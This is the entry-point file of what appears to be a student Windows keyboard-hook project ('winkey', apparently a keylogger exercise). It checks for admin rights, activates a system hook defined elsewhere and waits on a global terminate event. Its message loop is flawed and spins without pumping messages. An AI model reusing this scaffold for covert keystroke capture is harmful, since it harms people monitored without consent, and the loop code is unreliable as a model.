/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/21 16:17:17 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "winkey.h"

	#include <stdio.h>
	#include <windows.h>

#pragma endregion

#pragma region "Variables"

	// Aqui van las variables, si las hay

#pragma endregion

#pragma region "Is Admin"

	BOOL IsAdmin(void) {
		BOOL isAdmin = FALSE;
		HANDLE hToken = NULL;
		
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
				isAdmin = elevation.TokenIsElevated;       
			CloseHandle(hToken);
		}
		
		return (isAdmin);
	}

#pragma endregion

#pragma region "Main"

	int main(void) {
		// check if it has administrator privileges
		if (!IsAdmin()) return (printf("\nAdministrator privileges are required\n"), 1);
		
		// Activar el hook
		if (!ActivateHook()) {
			return 1;
		}

		// Loop principal para manterner el hook activo
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {

			HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");
			while(TRUE) {
				if (WaitForSingleObject(hEvent, 100) == WAIT_OBJECT_0) {
					// Log or do whatever before closing
					break;
				}
			}
		}
		
		// Desactivar el hook antes de salir
		DeactivateHook();

		// Wait for close event

		return (0);
	}

#pragma endregion
